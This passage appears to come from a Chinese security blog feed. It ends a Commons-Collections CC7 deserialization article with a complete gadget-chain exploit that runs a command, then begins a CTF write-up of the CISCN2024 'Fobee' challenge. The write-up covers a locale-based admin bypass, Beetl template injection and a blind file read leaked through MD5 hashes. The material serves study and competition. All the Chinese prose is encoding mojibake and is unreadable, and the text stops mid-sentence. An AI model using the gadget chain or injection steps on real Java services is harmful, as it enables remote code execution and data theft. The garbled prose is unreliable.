class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> getChainedTransformer();<br><br>            Map&lt;String, Integer&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            Map&lt;String, Integer&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>            Map&lt;String, Integer&gt; map1 = LazyMap.decorate(hashMap1, chain);<br>            map1.put(<span class="hljs-string">&quot;00&quot;</span>, <span class="hljs-number">1</span>);<br>            Map&lt;String, Integer&gt; map2 = LazyMap.decorate(hashMap2, chain);<br>            map2.put(<span class="hljs-string">&quot;.n&quot;</span>, <span class="hljs-number">1</span>);<br>            Hashtable&lt;Map&lt;String, Integer&gt;, Integer&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>            hashtable.put(map1, <span class="hljs-number">1</span>);<br>            hashtable.put(map2, <span class="hljs-number">1</span>);<br>            map2.remove(<span class="hljs-string">&quot;00&quot;</span>);<br>            deserialize(serialize(hashtable));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it_exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct, it1, it2, it_exec&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos)) &#123;<br>            oos.writeObject(obj);<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>            ois.readObject();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728232439088.png" alt="image-20240728232439088"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><img src="/2024/07/28/Commons-Collections/image-20240728233307715.png" class="" title="image-20240728233307715"><p>ç”±æ­¤CCé“¾å‘Šä¸€æ®µè½ï¼ŒCBé“¾éšç¼˜å†è®²å§ã€‚</p><p>çœ‹å®ŒCCé“¾åªèƒ½è¯´ååºåˆ—åŒ–åˆæ­¥å…¥é—¨ï¼Œå®æˆ˜è°ƒé“¾å­ä¹Ÿä¼šåç»­ä¸€æ­¥æ­¥å†™ä¸Šçš„ã€‚</p><p>æˆ‘ä¸€å®šè¦æˆä¸ºJavaé«˜æ‰‹ï¼ï¼ï¼ï¼</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/">https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/</a></p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">https://wx.zsxq.com/dweb2/index/tags/Javaå®‰å…¨æ¼«è°ˆ/551511412514</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125631391">Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-commons-collections4åˆ©ç”¨é“¾ï¼ˆCC2å’ŒCC4ï¼‰-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121?ops_request_misc=%7B%22request_id%22:%22172217921116800225595414%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172217921116800225595414&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127580121-null-null.nonecase&utm_term=CC5">Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-CC&amp;CBé“¾æ€è·¯æ•´ç†-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html#commonscollections5">Javaååºåˆ—åŒ–ä»URLDNSåˆ°CommonsCollections1-7 - KingBridge - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024-Final-AWDP-Fobee</title>
    <link href="/2024/07/28/CISCN2024-Final-AWDP-Fobee/"/>
    <url>/2024/07/28/CISCN2024-Final-AWDP-Fobee/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡å›½èµ›ç®—æ˜¯çˆ†ç§äº†ï¼Œæ‹¿ä¸‹äº†å…¨å›½æ€»å† å†›ã€‚</p><p><a href="https://mp.weixin.qq.com/s/HEdvNGKRnd0XBJwR8zAi4Q">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004124171.png" alt="image-20240728004124171"></p><p>ç®—æ˜¯è®©å¤©æ¢åç»§æœ‰äººäº†å§ã€‚</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004719598.png" alt="image-20240728004719598"></p><p>ï¼ˆé¢†å¥–çš„é‚£ä½æ˜¯æˆ‘hhhhhï¼Œåœ¨å·¦äºŒæŒ¨ç€å·å¤§ç½‘å®‰é™¢é™¢é•¿ï¼‰</p><p>ä¸»è¦è¿˜æ˜¯ç¬¬äºŒå¤©çš„æ¸—é€æ¯”è¾ƒé€‚åˆæˆ‘å§å“ˆå“ˆï¼Œå¤©æ—¶åœ°åˆ©äººå’Œï¼Œé˜Ÿå‹ä¹Ÿå¾ˆç»™åŠ›ï¼Œæœ€åç›´æ¥ä¸€é¼“ä½œæ°”å†²åˆ°äº†æ¦œé¦–ğŸ˜€</p><p>æ¸—é€çš„wpä¸æ‰“ç®—å†™ï¼Œåæ­£ç½‘ä¸Šä¹Ÿæœ‰æ‰“çš„æ¯”æˆ‘å¤šä¸€é“é¢˜çš„å†™äº†wpï¼Œæˆ‘ä»¬æ¸—é€æ˜¯å¹¶åˆ—ç¬¬äºŒï¼Œæ®è¯´äº‘é•œä¼šä¸Šï¼Œåˆ°æ—¶å€™å†çœ‹çœ‹èƒ½ä¸èƒ½å†²ä¸‹DCäº†å´å½“æ—¶çš„é—æ†¾ã€‚</p><p>ç¬¬ä¸€å¤©çš„awdpçš„webï¼Œæˆ‘å°±ä¿®äº†ä¸€ä¸ªsolon-masterï¼Œé‚£é“çš„fixå¾ˆç®€å•ï¼Œå› ä¸ºlibé‡Œå¯ä»¥å‘ç°snakeyamlå’Œlogbackï¼Œç›´æ¥æŠŠå…³é”®å­—snakeå’Œlogç»™banæ‰å°±å¯ä»¥äº†ï¼Œç„¶åæˆ‘è¿‡æ»¤å¾—æ›´ç‹ ï¼Œç›´æ¥ä»€ä¹ˆ@ã€$ã€&lt; è¿™äº›å¸¸è§æ‰“jsonæ ¼å¼çš„ååºåˆ—åŒ–ç¬¦å·ç»™banäº†ï¼Œæ‰€ä»¥æ„å¤–çš„ç¬¬ä¸‰è½®å°±æ‹¿ä¸‹äº†fixï¼Œå¹¶åˆ—äºŒè¡€fixå§ç®—ï¼Œè¿‘ä¹æ˜¯åƒæ»¡äº†checkğŸ¤­ğŸ¤­ğŸ¤­</p><p>å”¯ç‹¬è¿™ä¸ªFobeeè®©æˆ‘å¤´ç–¼ï¼Œå½“æ—¶æˆ‘å‡ ä¹åé¢å‡ ä¸ªå°æ—¶éƒ½åœ¨çœ‹è¿™ä¸ªï¼Œç„¶è€Œä¿®å‡ºæ¥çš„ä¹Ÿåªæœ‰å‡ ä¸ªé˜Ÿï¼Œæ‰“å‡ºæ¥çš„ä¹Ÿä¸è¿‡ä¸‰ä¸ªæ•°ã€‚</p><p>å…¶ä¸­ä¸€ä¸ªæ‰“æ³•æ˜¯å­¦é•¿ç»™çš„ï¼Œè¿™é‡Œåšä¸€ä¸‹æµ…æµ…çš„å¤ç°ï¼ˆå­¦é•¿tqlå‘œå‘œå‘œå‘œï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆæ˜¯çœ‹çœ‹ä»£ç é€»è¾‘ï¼š</p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fobee;<br><br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.beetl.core.BeetlKit;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHARACTERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> generateRandomString(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;index.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;=====&quot;</span> + password + <span class="hljs-string">&quot;=====&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/render&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">render</span><span class="hljs-params">(String pass, String tp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;render.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password)) &#123;<br>            <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>            System.out.println(result);<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, getMD5Hash(result));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Render Page&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/env&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">env</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());<br>            sb.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getMD5Hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>        md.update(input.getBytes());<br>        <span class="hljs-type">byte</span>[] digest = md.digest();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">byte</span>[] var4 = digest;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> digest.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> var4[var6];<br>            sb.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b &amp; <span class="hljs-number">255</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªè·¯ç”±åŸºæœ¬ä¸€ç›®äº†ç„¶ï¼Œé¦–å…ˆæ˜¯è¦çŸ¥é“è¿™ä¸ªModelAndViewçš„é»˜è®¤ä¼ å‚æ˜¯GETï¼Œä¼ å‚éƒ½æä¸æ˜ç™½åŸºæœ¬å¯ä»¥å‘Šåˆ«äº†ã€‚</p><p>é¦–å…ˆè¿›å»çš„æ ¹è·¯ç”±æ˜¯éœ€è¦ä½ ä¼ å‚usernameï¼Œä½†æ˜¯è¦æ»¡è¶³ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœ¬æ¥fixæˆ‘æ˜¯æƒ³ä¸‹é¢ååºåˆ—åŒ–ä¿®ä¸åŠ¨ï¼Œåœ¨è¿™é‡Œè¿‡æ»¤ç‹ ä¸€ç‚¹ï¼Œä½†æ˜¯å½“ç„¶ä¹Ÿæ˜¯checkä¸è¿‡ã€‚</p><p>å®ƒåˆè¦ä½ æ˜¯adminï¼Œåˆè¦ä½ toLowerCaseç»•è¿‡ä¸æ˜¯adminï¼Œé‚£æ€ä¹ˆç»•ï¼Ÿï¼Ÿï¼Ÿ</p><p>å…¶å®ä½ æ‰“å¼€IDEAï¼Œæ‹–è¿‡å»åˆ°toLowerCaseï¼Œå®ƒè‡ªå·±å°±å‘Šè¯‰ä½ äº†ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728001510929.png" alt="image-20240728001510929"></p><p>è¿™ä¸ªlocaleçš„ä¸ä¸€è‡´ä¼šå¯¼è‡´ä¸€ä¸ªå­—ç¬¦æœ‰å¤šç§è¯†åˆ«æ–¹å¼ï¼Œè¿™é‡Œå°±å‘Šè¯‰ä½ äº† <strong>i</strong> åœ¨LATIN SMALL LETTERé‡ç­‰æ•ˆäº <strong>\u0131</strong> ,å…¶å®ä¸éœ€è¦æ·±å…¥ç†è§£ï¼Œè¿™é‡Œå°±èƒ½ç»•äº†ï¼Œè¿›å»åå°±èƒ½é‚£é“passwordçš„å›æ˜¾ã€‚</p><p>æˆ‘ä»¬æ¥ç€çœ‹è·¯ç”±ï¼Œä¸‹é¢çš„renderè·¯ç”±ï¼Œå¾ˆå®¹æ˜“çœ‹åˆ°attackçš„ç‚¹åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯base64è§£å¯†ä¼ å‚çš„tpï¼Œç„¶åè°ƒç”¨åˆ°BeetlKit.renderè¿›è¡Œæ¸²æŸ“ï¼Œå…¶å®åº”è¯¥å°±æ˜¯ä¸ªSSTIã€‚</p><p>ä½†æ˜¯è¿›å…¥è¿™é‡Œéœ€è¦passwordï¼Œè€Œä¸Šé¢è‹¥ç»•è¿›å»äº†å°±æ‹¿åˆ°äº†passwordï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå°±å®Œæˆäº†ã€‚</p><p>æ€ä¹ˆæ‰“SSTIå‘¢ï¼Œæˆ‘ä»¬è§£åŒ…ä¸€ä¸‹è¿™ä¸ªBeetlKitè·Ÿè¿›ä¸€ä¸‹ï¼š</p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002111368.png" class="" title="image-20240728002111368"><p>ä¸€ä¸ªæ‰“æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹ã€‚</p><p>ç„¶è€Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹ä¸å‡ºæ¥ä»–è¦å¹²å•¥ï¼Œå…·ä½“åŸç†è¿™é‡Œæœ‰ç¯‡æ–‡ç« å¯ä»¥çœ‹çœ‹ï¼š</p><p><a href="https://xz.aliyun.com/t/8695?time__1311=n4+xnD0DcDu7G=DCzGkDlhje3iKt4Y5feeEd4x">ä¸€æ¬¡æ„å¤–çš„ä»£ç å®¡è®¡â€”-JfinalCMSå®¡è®¡ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002358967.png" alt="image-20240728002358967"></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002405853.png" alt="image-20240728002405853"></p><p>è¿™ä¸‹SSTIä¼šæ‰“äº†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥å£å®ç°æ¶æ„ç±»åŠ è½½ï¼Œä½†æ˜¯beetlKitè¿‡æ»¤å¾—æœ‰ç‚¹ç‹ ï¼Œå¸¸è§„çš„ç›´æ¥æ‰“runtimeè¡Œä¸é€šã€‚</p><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°å®ƒå†…éƒ¨ä»€ä¹ˆç©æ„èƒ½è°ƒç”¨runtimeæ‰“æˆåŠŸï¼Œå­¦é•¿æ‰¾åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.antlr.v4.runtime.misc.Utils.readFile<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002829857.png" alt="image-20240728002829857"></p><p>æ˜¾ç„¶è¿™é‡Œå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯å›æ˜¾éœ€è¦ç±»ä¼¼ç›²æ³¨çš„æ‰‹æ®µï¼Œä¸€ä¸ªä¸ªå­—ç¬¦è¯»å‡ºæ¥ï¼ˆtqlå­¦é•¿wwwwwï¼‰ï¼Œç„¶åä¸‹é¢å®ƒä¼šè‡ªå·±æŠŠè¯»åˆ°çš„ä¸œè¥¿è¿›è¡ŒMD5åŠ å¯†å¹¶æ‰“åœ¨ç½‘é¡µä¸Šã€‚</p><p>è¿™ä¸ª&#x2F;envä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œåæ­£éƒ½æ˜¯jdk1.8æ‰€ä»¥æ„ä¹‰ä¸å¤§ã€‚</p><p>æ‰€ä»¥æ€è·¯å°±æœ‰äº†ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>ã€ æ ¹è·¯ç”±<span class="hljs-keyword">admin</span>ç»•è¿‡æ‹¿<span class="hljs-keyword">password</span><br><span class="hljs-number">2</span>ã€ å¸¦<span class="hljs-keyword">password</span>è®¿é—®/renderï¼Œtpä½¿ç”¨base64åŠ å¯†çš„æ¶æ„æ³¨å…¥payloadè¯»flagï¼Œç”±MD5æ ¼å¼çˆ†å‡º<br><span class="hljs-number">3</span>ã€ MD5ä¸€ä¸ªä¸ªå­—ç¬¦çˆ†ç 